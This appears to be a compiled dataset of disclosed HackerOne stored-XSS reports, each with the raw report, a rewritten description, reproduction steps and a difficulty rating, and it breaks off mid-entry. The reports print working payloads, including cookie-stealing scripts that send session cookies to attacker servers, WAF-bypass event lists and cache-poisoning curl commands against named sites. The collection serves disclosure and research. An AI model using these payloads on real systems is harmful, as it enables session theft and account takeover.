INJECTIONS NOT EASY
==================================================

Total reports analyzed: 62

Cross-site Scripting (XSS) - Stored Vulnerabilities (16 reports)
--------------------------------------------------

Report https://hackerone.com/reports/1010466: Blind XSS on image upload
================================================================================
RAW DESCRIPTION:

Summary:
The CSRF vulnerability make a request for support.cs.money/upload_file; This upload_file does not have csrf token/ origin/ reference verification!
The XSS allows to execute JS. The payload of the XSS stay in the param 'filename' of the CSRF request.
Steps To Reproduce:
XSS
use a proxy like burp suite and turn intercept on
upload a file to the support chat
change the filename to \"><img src=1 onerror=\"url=String104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp'GET',url,true;xhttp'send';
open the chat support and xss will activate
CSRF
create a file html in some server
create a form with a file and the payload name
send to a new tab. This one will post the image with payload
Supporting Material/References:
https://onlinestringtools.com/convert-string-to-ascii to convert the attacker's website link to ascii
Impact
Allows the hacker to execute javascript. If the victim click in a link provided by the hacker, then go to the chat support in ANY TIME after this, XSS will be activated.
For the guys of support chat, they don't even need to click in the link for the XSS activate.



================================================================================
Vulnerability Description:
The vulnerability combines Blind XSS and CSRF in the image upload functionality of a support chat system. The lack of CSRF protection allows attackers to force victims to upload files with malicious filenames containing XSS payloads. When support staff view the uploaded file in the chat, the XSS payload executes, potentially stealing sensitive information like cookies.

Steps to Reproduce:
1. Use a proxy like Burp Suite to intercept the file upload request to the support chat.
2. Modify the filename parameter to include a malicious XSS payload that triggers when the file is viewed in the chat.
3. Create an HTML file with a form that automatically submits a file upload request to the vulnerable endpoint with the XSS payload in the filename.
4. Host the HTML file on a server and trick a victim into opening it, which will trigger the CSRF attack.
Exploitation Difficulty:
This vulnerability requires understanding both CSRF and XSS attacks, and how to chain them together. The attacker needs to craft a specific XSS payload that works in the filename context and then deliver it via CSRF. While both components are common vulnerabilities, chaining them together and finding the right context for the XSS adds complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1339034: Blind XSS via Feedback form.
================================================================================
RAW DESCRIPTION:

Summary:
Hi Team,
I found Blind XSS which is triggered on the admin panel. I was trying to add widgets on the installation page for default theme. When the installation was done, I saw a question like that Are you happy with how everything looks?. I clicked the No, please remove all widgets button and then the feedback form arrives. I submitted my blind XSS payload. It triggered in 20-30 minutes on https://judge.me/admin which requires the HTTP Basic Authentication. I can't get the admin session cookie but I can collect all of the admin pages.
Steps To Reproduce:
Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials. (credentials in the Credentials Header)
Click the Apps tab from the left side and then click Judge.me Product Reviews.
Click Add Widgets then Start Installation and continue.
When the installation is done. It asks Are you happy with how everything looks?. Choose No, please remove all widgets button. Feedback form appears and put your blind xss payload.
Wait for payload triggering.
Supporting Material/References:
Vulnerable Page URL : https://judge.me/admin/████████
Referer: https://judge.me/admin/███
Cookies:http ██████████████
Credentials
Code 197 Bytes
1email:  ██████████@yopmail.com
2password: ███████
3tempmail: https://yopmail.com/?judgeme-███████████ ( it can be necessary when you are login )
4payload: "><script src=https://yourxssdomain></script>
Admin Page
█████
Vulnerable Page
███████
Steps to Reproduce Video
████
Impact
Blind XSS leads to access the admin panel. It may contain information leaks about other shop owners' reports. Executes javascript code on admin panel. Stealing admin cookies.



================================================================================
Vulnerability Description:
Blind XSS via feedback form that triggers on the admin panel, allowing the attacker to execute JavaScript in the context of the admin panel and potentially access sensitive information.

Steps to Reproduce:
1. Go to https://odo-tester.myshopify.com/admin/ and login with the test credentials.
2. Click the Apps tab from the left side and then click Judge.me Product Reviews.
3. Click Add Widgets then Start Installation and continue.
4. When the installation is done, choose 'No, please remove all widgets' button.
5. Submit a blind XSS payload in the feedback form that appears.
6. Wait for the payload to trigger on the admin panel (https://judge.me/admin).
Exploitation Difficulty:
The attack involves navigating through a series of UI interactions and submitting a payload in a feedback form, which is a straightforward process. The blind XSS aspect adds some complexity, but the steps to reproduce are clear and do not involve subtle interactions or complex application states.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1342009: Stored XSS in merge request creation page through payload in approval rule name
================================================================================
RAW DESCRIPTION:

Summary
Hi GitLab team, I found a stored XSS in merge request creation page caused by a payload in the name of an "approval rule".
Adding approval rules is a feature that is unlocked for premium subscriptions or above. This does not seem to block it from being used against regular users on for example Gitlab.com by inviting them into the "infected project".
This occurs when adding an "Approval rule" to a project and giving it a javascript/html payload as the name and attaching the rule to an approver. When a user tries to create a merge request in the project and opens the "Reviewers" dropdown, information about the user with the attached rule will be shown and the rule name will be injected underneath.
With the payload
Code 115 Bytes
1<iframe/srcdoc='<script/src=/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js></script>'></iframe>
this XSS bypasses the current CSP on Gitlab.com (tried it with an Ultimate trial and inviting a user without a trial to the project)
As I got the impression that all XSS are treated equal when reporting a similar issue, I have not made any deeper analysis of the reason for this firing. Thought I just report it right away. Please reach back to me if you need me to research the impact deeper! As an example, it does not fire when one "edits" a MR which is a bit odd...
Steps to reproduce
Create two user accounts, attacker_user and victim_user (attacker_user must have at least premium features enabled)
Log in as attacker_user
Create a project xss_project by going to https://gitlab.com/projects/new#blank_project
Go to projects settings on https://gitlab.com/attacker_user/xss_project/edit and scroll down to and expand "Merge request approvals"
<image_0>
Click "Add approval rule"
Put the payload as the name, If on Gitlab.com use
Code 115 Bytes
1<iframe/srcdoc='<script/src=/joaxcar_group/first/-/jobs/1415515489/artifacts/raw/data/alert.js></script>'></iframe>
if this is tested on a server without CSP feel free to use the payload
Code 39 Bytes
1<script>alert(document.domain)</script>
Search for and select attacker_user as approver and click create rule.
<image_1>
Invite victim_user to the project as Developer on https://gitlab.com/attacker_user/xss_project/-/project_members
Log out and log back in as victim_user
Go to https://██████████/user_01/pub/-/branches/new and create a branch new
Directly click on "Create merge request" (which will appear on the screen)
<image_2>
Click on the dropdown at "Reviewers"
Payload will trigger
<image_3>
Impact
Stored XSS with CSP bypass. Full Javascript functionality without restrictions, so everything from stealing data to generating and exfiltrating access tokens.
Examples
If you access my private project at Gitlab.com (https://gitlab.com/ultimate-joaxcar-test3/xss) as an admin, you should be able to create an MR and trigger payload. (Just an alert box)
What is the current bug behavior?
Approver rule name is injected in the user information without proper sanitization.
What is the expected correct behavior?
The name should be sanitized
Output of checks
This bug happens on GitLab.com
Impact
Stored XSS with CSP bypass. Full Javascript functionality without restrictions, so everything from stealing data to generating and exfiltrating access tokens.



================================================================================
Vulnerability Description:
Stored XSS in merge request creation page through payload in approval rule name, bypassing CSP and allowing full JavaScript execution

Steps to Reproduce:
1. Create two user accounts: attacker_user (with premium features) and victim_user
2. Attacker creates a project and adds an approval rule with XSS payload as the name
3. Attacker invites victim_user to the project as a Developer
4. Victim logs in, creates a branch and attempts to create a merge request
5. Victim opens the 'Reviewers' dropdown, triggering the XSS payload
Exploitation Difficulty:
The attack requires understanding of multiple components (approval rules, merge request workflow, CSP bypass techniques) and involves non-obvious interaction between these components. The attacker needs to manipulate application state by creating specific project settings and user permissions.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1665658: Stored-XSS with CSP-bypass via labels' color
================================================================================
RAW DESCRIPTION:

Gitlab allows to import a project from Github. It imports also the labels whose colors are not sanitized. This leads to Stored-XSS.
Step to reproduce
To reproduce, we need the following prerequisite:
Github does not allow neither to create arbitrary label colors. You can find in the attachment a dummy Github server
A VM/machine to host the dummy server above with an public IP though that gitlab.com can access to.
I created the dummy server using nodejs, so you need to have also nodejs on the machine
A Gitlab personal access token. Go here to create a new token with within api scope.
Step 1: run the dummy server
Copy the attachment file on your machine and decompress it to any folder, e.g., /tmp/dummy-server
Go to /tmp/dummy-server then run this command: node ./index.js YOUR_IP YOUR_PORT in which, you should replace IP and PORT with the one you have. For example, sudo node index.js 51.75.74.52 80
Step 2: trigger Gitlab import
Open a new terminal, then run the following command in which:
YOUR_IP and YOUR_PORT by the values in the previous step
YOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement
YOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name
YOUR_IP and YOUR_PORT by the values in the previous step
YOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement
YOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name
Code 417 Bytes
1curl -kv "https://gitlab.com/api/v4/import/github" \
2  --request POST \
3  --header "content-type: application/json" \
4  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
5  --data '{
6    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
7    "repo_id": "523303538",
8    "target_namespace": "YOUR_GITLAB_USERNAME",
9    "new_name": "xss-on-label-color",
10    "github_hostname": "http://YOUR_IP:YOUR_PORT"
11}'
For example:
Code 403 Bytes
1curl -kv "https://gitlab.com/api/v4/import/github" \
2  --request POST \
3  --header "content-type: application/json" \
4  --header "PRIVATE-TOKEN: AAAAAAAAAAAAAYYYYabc" \
5  --data '{
6    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
7    "repo_id": "523303538",
8    "target_namespace": "yvvdwf",
9    "new_name": "xss-on-label-color",
10    "github_hostname": "http://51.75.74.52:80"
11}'
After finishing, you can view the list of the labels of the imported project. You should see an popup created by this js alert(document.domain)
An example is available here (private project): https://gitlab.com/yvvdwf/xss-on-label-color/-/labels
Impact
Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.
Impact
Stored-XSS with CSP-bypass allows attackers to execute arbitrary actions on behalf of victims at the client side.



================================================================================
Vulnerability Description:
GitLab's project import feature from GitHub does not sanitize label colors, allowing stored XSS attacks. By importing a project with malicious label colors, an attacker can execute arbitrary JavaScript in the context of the victim's session, bypassing CSP protections.

Steps to Reproduce:
1. Set up a dummy GitHub server with Node.js that allows arbitrary label colors and host it on a public IP accessible by GitLab.
2. Use a GitLab API token to import a project from the dummy GitHub server, including labels with malicious color values that contain XSS payloads.
3. View the imported project's labels in GitLab to trigger the XSS payload, which bypasses CSP protections.
Exploitation Difficulty:
The vulnerability requires setting up a custom GitHub server to bypass GitHub's label color restrictions, understanding GitLab's project import API, and crafting a payload that bypasses CSP. The interaction between these components is non-obvious and requires knowledge of both systems.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/1795197: Cache Poisoning allows redirection on JS files
================================================================================
RAW DESCRIPTION:

Hi,
I found the following Cache Poisoning vulnerability:
Send the following request: ( this will poison /test.js into redirecting to https://youst.in/test.js)
Code 564 Bytes
1GET /test.js?cb=1 HTTP/2
2Host: design.glassdoor.com
3Sec-Ch-Ua: "Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"
4Sec-Ch-Ua-Mobile: ?0
5User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
6Sec-Ch-Ua-Platform: "macOS"
7Accept: text/css,*/*;q=0.1
8Sec-Fetch-Site: same-origin
9Sec-Fetch-Mode: no-cors
10Sec-Fetch-Dest: style
11Referer: https://design.glassdoor.com/
12Accept-Encoding: gzip, deflate
13Accept-Language: en-US,en;q=0.9
14X-Forwarded-Scheme:  http
15X-Forwarded-Host: youst.in
16
You should notice the Cf-Cache-Status: MISS header when first sending the request. After sending another request, you should see Cf-Cache-Status: HIT, confirming the redirect has been cached.
You can also visit the url in a browser and notice you get redirect to youst.in.
Impact
An attacker can use the same attack against valid JS files leading to full control over the loaded JS. If any Glassdoor websites import javascript files from https://design.glassdoor.com/* they are susceptible to a Stored XSS attack via Cache Poisoning.



================================================================================
Vulnerability Description:
The vulnerability is a cache poisoning issue that allows an attacker to redirect requests for JavaScript files to a malicious domain. By manipulating cache keys and headers, the attacker can cause the server to cache a malicious response, leading to potential stored XSS attacks if the poisoned JS files are imported by other Glassdoor websites.

Steps to Reproduce:
1. Send a request to /test.js?cb=1 with specific headers including 'X-Forwarded-Host: youst.in' to poison the cache.
2. Verify the cache poisoning by checking the 'Cf-Cache-Status: HIT' header in subsequent requests and observing the redirection to 'youst.in'.
Exploitation Difficulty:
The attack involves understanding cache mechanisms and header manipulation, but the steps are straightforward once the cache poisoning vector is identified. The interaction between the headers and the cache is not overly complex, and the logic is similar to other cache poisoning vulnerabilities.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/218226: Stored XSS in comments on https://www.starbucks.co.uk/blog/*
================================================================================
RAW DESCRIPTION:

Hi,
there are a lot of published blog post under https://www.starbucks.co.uk/blog/*. You can find plenty of them using this google dork site:www.starbucks.co.uk inurl:blog/. Notice the comments functionality at the bottom at the page.
When a comment is sent the following request is made:
Code 569 Bytes
1POST /blog/addcomment HTTP/1.1
2Host: www.starbucks.co.uk
3User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
4Accept: text/html, */*; q=0.01
5Accept-Language: en-US,en;q=0.5
6X-NewRelic-ID: VQUHVlNSARACV1JSBAIGVA==
7Content-Type: application/x-www-form-urlencoded; charset=UTF-8
8X-Requested-With: XMLHttpRequest
9Referer: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability
10Content-Length: 321
11Cookie: [redacted]
12Connection: close
13
14Body=Nice&ParentId=0&PostID=1241&author=ope67164%40disaq.com
The values of the Body and author parameters will be rendered into the page as a new comment. The value from the author parameter is not correctly encoded. This allows to inject arbitrary valid HTML.
You seem to be using a WAF which will block request (500) containing <script></script> and various input matching on*=. However, I managed to find a bypass:
Code 87 Bytes
1</li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
This will work on latest FF as can be seen here: https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability
Note that the closing tags are just to make the script execute (I'm sorry for the multiple payloads on that site, once the above comment was sent, all previous attempts started to work. Would be great if you could clean up the comments at the end).
Here is a list of all potential on*= events I could find, that will bypass your WAF an can be used to create cross-browser payloads:
Code 186 Bytes
1onsearch
2onwebkitanimationiteration
3onwebkitanimationstart
4onanimationiteration
5onwebkitanimationend
6onanimationstart
7ondataavailable
8ontransitionend
9onanimationend
10onreceived
11onpopstate
To fix this issue make sure the author value is correctly encoded. It could be also taken from the current user's session instead of the POST data. Also I recommend adding the aforementioned events to your WAF blacklist.
Please let me know in case you need any more information from my side.



================================================================================
Vulnerability Description:
The vulnerability is a stored Cross-Site Scripting (XSS) in the comments section of Starbucks' blog posts. The 'author' parameter in the comment submission is not properly sanitized, allowing an attacker to inject arbitrary HTML and JavaScript. The attack bypasses the WAF by using less common event handlers like 'onbeforescriptexecute'.

Steps to Reproduce:
1. Navigate to a Starbucks blog post (e.g., https://www.starbucks.co.uk/blog/setting-the-record-straight-on-starbucks-uk-taxes-and-profitability)
2. Submit a comment with a malicious payload in the 'author' parameter, such as: </li></ul></li></ul></div></div></div></div><test/onbeforescriptexecute=confirm`h1poc`>
3. Observe that the payload executes when the page is reloaded or viewed by another user
Exploitation Difficulty:
The vulnerability involves understanding the comment submission process, identifying an unsanitized input field, and crafting a payload that bypasses the WAF. While the core XSS is straightforward, the WAF bypass adds a layer of complexity by requiring knowledge of less common event handlers.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/249131: Ability to create own account UUID leads to stored XSS
================================================================================
RAW DESCRIPTION:

I found an interesting bug where the system allows a user to create their own UUIDs. There are character length restrictions on this action, however it's not bound to a specific set of characters. Even so, I was able to include an external script that I URL shortened to just hit the character limit exactly. I was lucky I didn't need to add the closing script tag, because the one at the end of the line takes care of it. I wanted to get a full PoC rather than an alert(1), because I think it could have been argued that the space was too small to actually do anything meaningful with.
This attack is similar in the way to #246806, except I'm quite confident this will be executed on admin panels and anywhere else a UUID is displayed, since sanitization on that attribute is highly unlikely.
PoC
Just replace the email with the one you own, and click the email confirmation link.
Code 439 Bytes
1POST /c/user HTTP/1.1
2Host: app.upserve.com
3Accept: application/json
4Accept-Language: en-US,en;q=0.5
5X-Requested-With: XMLHttpRequest
6Content-Type: application/x-www-form-urlencoded; charset=UTF-8
7Referer: https://app.upserve.com/settings/account
8Content-Length: 134
9Content-Type: text/plain;charset=UTF-8
10DNT: 1
11Connection: close
12
13uuid=</script><script src=//is.gd/z0i2sU>&email=[YOUR EMAIL]&brand_pretty_url=ace-wasabis-rock-n-roll-sushi
Live PoC
Visit the following page: https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002
The generated HTML looks like:
YUI.namespace('Env.DATA').consumer = {"uuid":"</script><script src=//is.gd/z0i2sU>","firstName":null,
Thanks,
-- Tanner



================================================================================
Vulnerability Description:
The vulnerability allows a user to inject arbitrary JavaScript via a crafted UUID, leading to stored XSS. The system fails to properly sanitize the UUID input, enabling script execution in contexts where the UUID is displayed (e.g., admin panels).

Steps to Reproduce:
1. Send a POST request to `/c/user` with a crafted `uuid` parameter containing a script tag and a URL-shortened external script source.
2. Visit the generated link (e.g., `https://app.upserve.com/b/ace-wasabis-rock-n-roll-sushi?email_token=2aa7296c678e11e7ab2f0242ac110002`) to trigger the XSS payload.
Exploitation Difficulty:
The attack involves bypassing character length restrictions with a URL-shortened payload and leveraging the lack of input sanitization. While the payload crafting is straightforward, the discovery of the unsanitized UUID field and its impact across the application (e.g., admin panels) requires some insight.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/250837: Stored xss via template injection
================================================================================
RAW DESCRIPTION:

Hello Sir , I found Stored XSS in https://mercantile.wordpress.org/
POC is attached .
Steps to reproduce:
1.Login to your account.
2. Go to https://mercantile.wordpress.org/my-account/edit-address/ & fill details , press save & intercept this request in burp suit.
3.change name to {{constructor.constructor('alert(1)')()}} & forward request. as shown in screenshot.
Xss will popup when you visit your account page.
Although its self XSS. but following attack scenario makes it useful.
Anyone can make account on https://mercantile.wordpress.org/ using someone else email id, Its not verifying whether its your email id or not. Lets consider "A" makes account with "B" persons email & by using this technique store XSS payload in its account. After that "B" wants account on mercantile.wordpress.org with same email. so rather creating account with new email, "B" person just do forget password & recover & recover his account. but xss payload is still there in his account so attacker "A" can access victim "B" account anytime.
One more thing, even after changing name with https://mercantile.wordpress.org/my-account/edit-account/ setting payload is not removed its still there. so its make attack more sophisticated.
Thanks & Regards,
Akshay



================================================================================
Vulnerability Description:
This is a Stored XSS vulnerability via template injection on mercantile.wordpress.org. An attacker can inject malicious JavaScript code into the name field during account editing, which is then executed when the victim views their account page. The attack is compounded by the ability to create accounts with unverified email addresses, allowing an attacker to pre-load an XSS payload into a victim's account before they claim it.

Steps to Reproduce:
1. Login to your account on https://mercantile.wordpress.org/
2. Go to https://mercantile.wordpress.org/my-account/edit-address/ and fill in details, then intercept the request using Burp Suite
3. Modify the name field to {{constructor.constructor('alert(1)')()}} and forward the request
4. Visit your account page to trigger the XSS payload
Exploitation Difficulty:
The vulnerability involves understanding template injection and XSS, but the steps to exploit it are straightforward once the injection point is identified. The attack scenario adds some complexity by leveraging account creation and recovery flows, but the core vulnerability discovery is not highly complex.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/303730: Defacement of catalog.data.gov via web cache poisoning to stored DOMXSS
================================================================================
RAW DESCRIPTION:

An attacker can deface various pages on catalog.data.gov, leading to them executing malicious JavaScript when visited by a normal user.
The root problem is that the server trusts the X-Forwarded-Host HTTP header, and uses this to populate the 'data-site-root' and 'data-locale-root' attributes on the <body tag. Some JavaScript then fetches a JSON file from the URL specified in these attributes, and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.
This behaviour is harmless by itself, since I can't make a victim send a malicious HTTP header. Fortunately for me, I can ensure that the poisoned response sent to me is cached by CloudFront, meaning my payload will be served to loads of other users.
Please be careful when exploring this issue, as it's potentially quite easy to accidentally poison CloudFront's cache and antagonise your visitors. To safely replicate this issue, you can use the following steps:
Run curl command to poison cache:
curl -i -s -k -X $'GET' \
-H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' \
$'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
Visit the poisoned page:
https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6
Wait for a few seconds, and observe the popup caused by our injected alert(document.domain)
Behind the scenes, step 1 poisons the cache with a data-site-root value of 'portswigger-labs.net/catalog.data.gov_json_xss/json.php'. In step 2, some JavaScript fetches our json.php file from portswigger-labs.net, and uses our 'show more' JSON attribute to translate the 'show more' text on https://catalog.data.gov/dataset/consumer-complaint-database into "Mostrar más <svg onload=alert(document.domain)>"
This is the offending line of JavaScript:
var template_more = ['<tr class="toggle-show toggle-show-more">', '<td colspan="' + cols + '">', '<small>', '<a href="#" class="show-more">' + this.i18n('show_more') + '</a>', '<a href="#" class="show-less">' + this.i18n('show_less') + '</a>', '</small>', '</td>', '</tr>'].join('\n');
To mitigate this issue, I recommend addressing the X-Forwarded-Host reflection.
Please let me know if you have any questions.
Cheers,
James & Gareth
Impact
An attacker can deface most pages on catalog.data.gov.



================================================================================
Vulnerability Description:
An attacker can deface various pages on catalog.data.gov by poisoning the web cache to execute malicious JavaScript when visited by normal users. The server trusts the X-Forwarded-Host HTTP header, which is used to populate attributes on the <body> tag. JavaScript then fetches a JSON file from the URL specified in these attributes and writes the response to the page without escaping it, leading to a DOMXSS vulnerability.

Steps to Reproduce:
1. Run curl command to poison cache: curl -i -s -k -X $'GET' -H $'Host: catalog.data.gov' -H $'Accept-Encoding: gzip, deflate' -H $'Accept: /' -H $'Accept-Language: en' -H $'User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)' -H $'x-forwarded-host: portswigger-labs.net/catalog.data.gov_json_xss/json.php?' -H $'Connection: close' $'https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6' > /dev/null
2. Visit the poisoned page: https://catalog.data.gov/dataset/consumer-complaint-database?dontpoisoneveryone=6 and observe the popup caused by the injected alert(document.domain)
Exploitation Difficulty:
The attack involves multiple components (HTTP header manipulation, cache poisoning, DOMXSS) and requires understanding subtle interactions between them. The attacker must also be aware of how the server processes the X-Forwarded-Host header and how the JavaScript uses the injected data.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/415484: Stored xss
================================================================================
RAW DESCRIPTION:

Description :
WAF cut html tages but when put <!--> before tages we can bypass it :) .
Step to reproduce :
1-Open your store account
2-Navigate to https://xxx.myshopify.com/admin/settings/general
3-Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
4-Go to https://xxx.myshopify.com/admin/dashboards/live
5-XSS alert message
Impact
XSS attack



================================================================================
Vulnerability Description:
This is a stored XSS vulnerability in Shopify's admin interface where the WAF filters HTML tags but can be bypassed by inserting a specific HTML comment (<!-->) before the tags. This allows an attacker to execute arbitrary JavaScript in the context of the admin dashboard.

Steps to Reproduce:
1. Open your store account
2. Navigate to https://xxx.myshopify.com/admin/settings/general
3. Put your street address xss payload (xss"><!--><svg/onload=alert(document.domain)>)
4. Go to https://xxx.myshopify.com/admin/dashboards/live
5. XSS alert message
Exploitation Difficulty:
The vulnerability involves a simple bypass technique (HTML comment) to evade WAF filtering, which is a known method in XSS attacks. The steps to reproduce are straightforward and do not require complex interactions or state manipulation.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/534450: Account takeover through the combination of cookie manipulation and XSS
================================================================================
RAW DESCRIPTION:

Summary: A cookie based XSS on www.grammarly.com exists due to reflection of a cookie called gnar_containerId in DOM without any sanitization. Normally, gnar_containerId is being set by the server however a vulnerable endpoint at gnar.grammarly.com called "/cookies" allows us to manipulate cookies set for *.grammarly.com and gnar_containerId was one of them. Through the combination of these findings, we were able to bypass "CORS protection/HttpOnly cookie flag" and steal any Grammarly users cookie that visits a webpage that has our malicious javacript code.
Description: An endpoint at gnar.grammarly.com called "/cookies" allows us to set or get any cookie value we want. Sending a POST request sets the cookie value whereas sending a GET cookie returns the value of an existing cookie. In a normal scenario, an attacker could send a GET request to that enpoint and read user authentication cookie (grauth in this case)But due to the same origin policy, we were not able to read the response . Sending a POST request was still viable(as we did not have to read the response) and we were able to replace session cookies of users (who had browsed any webpage that contained our malicious javascript) and force them to use our session. This allowed us to see any document that was created after the point of exploitation.
This was our initial bug bounty report (#532553) however, HackerOne staff did not approve it and said this is how cookies are supposed to work. So we decided to investigate this case further.
Then we have found that Grammarly uses multiple cookies and one of them is called "gnar_containerId". We have discovered that this cookie gets reflected on the "www.grammarly.com" in src attribute of an img tag. The value inside the img tag is encoded and not exploitable. However there is another img tag, surrounded with noscript tags. The second value that is inside of the noscript tags was not encoded and prone to XSS. Combining the XSS vulnerability found in the www.grammarly.com domain and the cookie manipulation through gnar.grammarly.com/cookies allowed us to inject a gnar_containerId cookie that holds our malicious javascript code
Our malicious payload that was injected into the context of grammarly.com will make a get request to gnar.grammarly.com/cookies to retrieve the values of the session cookies of the currently logged in user and send it back to our server. Normally, an ordinary XSS would not lead to such cases as grammarly cookies are set to be httponly and secure, so it is not possible to manipulate cookies through DOM. But Thanks to the endpoint that we have discovered initially, we were able to retrieve/replace any cookies that was set by *.grammarly.com. We were able to bypass the CORS as our requests were sent on behalf of the grammarly.com and read the response.
To put it simply, if a user visits a webpage that we control, it will steal the cookies and send them to us. Our payload will make a post request to gnar.grammarly.com/cookies to replace the gnar_containerid with the second stage of our payload and the redirect the user to the vulnerable page. Upon this, our injected payload will get triggered and will make another request to gnar.grammarly.com/cookies on behalf of the grammarly.com, then will send the response body to a server that we control.
For the purpose of illustration, we just stole grauth cookie of a test account but we could actually steal any cookie set by grammarly.com.
Solution: This attack scenario was made possible because of the following:
gnar.grammarly.com/cookies does not check Referer information when it receives POST request. Adding a Referer check (assuming that no website other than the ones that hosted at *.grammarly.com is using that endpoint) will prevent client-side requests from 3rd parties.
There is no whitelist/blacklist for cookies that a client can alter. Disallowing the alteration of grauth and csrf-token cookies should be implemented.
Content based encoding was applied for noscript tags however with the combination of unnecessary trust to the cookies, an XSS was possible. Encoding should be applied for noscript tags too.
Browsers Verified In:
Google Chrome 73.0.3683.86 (Official Build) (64-bit)
Mozilla Firefox 60.6.1esr (64-bit)
Steps To Reproduce:
Host a webpage that is being served over HTTPS (to circumvent Mixed-Content protection)
Serve the HTML snipped below on the said page (called "Grammarly.html" for example):
Code 904 Bytes
1<html>
2
3<head>
4<title>Grammarly POC</title>
5<meta charset="utf-8"/>
6<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
7</head>
8
9<body>
10<script>
11
12    var cookie_hax = {
13        "gnar_containerId":"</noscript><script/src='https://<YOUR_DOMAIN_NAME>/poc.js'></scr"+"ipt><noscript>",
14    };
15
16    for (var name in cookie_hax) {
17        $.ajax({
18            type: "POST",
19            url: "https://gnar.grammarly.com/cookies?name=" + name + "&value=" + encodeURIComponent(cookie_hax[name]) + "&maxAge=2147483647",
20            cache: false,
21            xhrFields: {
22                withCredentials: true
23            },
24            crossDomain: true,
25            async: false,
26        });
27    }
28
29    window.location.replace("https://www.grammarly.com/upgrade?utm_source=upHook&app_type=app&page=free&utm_campaign=editorMenu&utm_medium=internal");
30
31</script>
32</body>
33
34</html>
Serve the javascript code below on the same webserver (called "poc.js" for example):
Code 254 Bytes
1var xhr = new XMLHttpRequest();
2xhr.open('GET', "https://gnar.grammarly.com/cookies?name=grauth");
3xhr.withCredentials = true;
4xhr.onload = function () {
5    this.open('GET', "https://<YOUR_DOMAIN_NAME>/" + this.response);
6    this.send();
7};
8xhr.send();
Browse the Grammarly.html and watch the webserver access logs (to extract cookie value)
Supporting Material/References:
Webserver access logs:
Code 474 Bytes
1178.251.40.58 - - [10/Apr/2019:13:23:04 +0000] "GET /poc.js HTTP/1.1" 200 736 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
2178.251.40.58 - - [10/Apr/2019:13:23:05 +0000] "GET /?cookie={██████████} HTTP/1.1" 200 3466 "https://www.grammarly.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36"
Impact
Account takeover via cookie stealing



================================================================================
Vulnerability Description:
A combination of cookie manipulation via a vulnerable endpoint and DOM-based XSS allows an attacker to steal session cookies, leading to account takeover. The attack bypasses HttpOnly and CORS protections by leveraging a server endpoint that improperly allows cookie manipulation.

Steps to Reproduce:
1. Host a webpage with malicious JavaScript that manipulates the gnar_containerId cookie via the gnar.grammarly.com/cookies endpoint.
2. Redirect the user to a vulnerable page on www.grammarly.com where the malicious cookie is reflected in an unencoded noscript tag, triggering XSS.
3. The XSS payload retrieves the user's session cookies via the same gnar.grammarly.com/cookies endpoint and sends them to an attacker-controlled server.
Exploitation Difficulty:
This vulnerability involves multiple complex components: discovering the cookie manipulation endpoint, identifying the XSS vector in the noscript tag, and crafting a payload that combines these to bypass security controls. The interaction between the cookie manipulation and XSS is non-obvious and requires deep understanding of both mechanisms.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/733248: Stored XSS in wordpress.com
================================================================================
RAW DESCRIPTION:

Summary:
Stored XSS as a comment or as a post (body or title) at
